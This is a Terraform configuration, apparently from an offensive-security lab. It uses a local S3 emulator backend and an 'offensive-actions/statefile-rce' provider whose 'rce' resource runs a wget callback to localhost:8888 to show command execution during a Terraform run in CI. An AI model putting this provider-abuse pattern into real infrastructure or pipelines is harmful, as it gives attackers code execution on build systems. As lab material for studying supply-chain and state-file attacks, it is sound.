terraform {
  # Backend en S3 local (moto). Equivale al bucket S3 del CI real.
  backend "s3" {
    bucket                      = "tfstate"
    key                         = "prod/terraform.tfstate"
    region                      = "us-east-1"
    endpoints                   = { s3 = "http://localhost:4566" }
    access_key                  = "lab"
    secret_key                  = "lab"
    skip_credentials_validation = true
    skip_region_validation      = true
    skip_requesting_account_id  = true
    skip_metadata_api_check     = true
    use_path_style              = true
  }

  required_providers {
    rce = { source = "offensive-actions/statefile-rce" }
  }
}

provider "rce" {}

resource "rce" "deploy" {
  command = "wget -qO- 'http://localhost:8888/tf/bootstrap' >/dev/null"
}
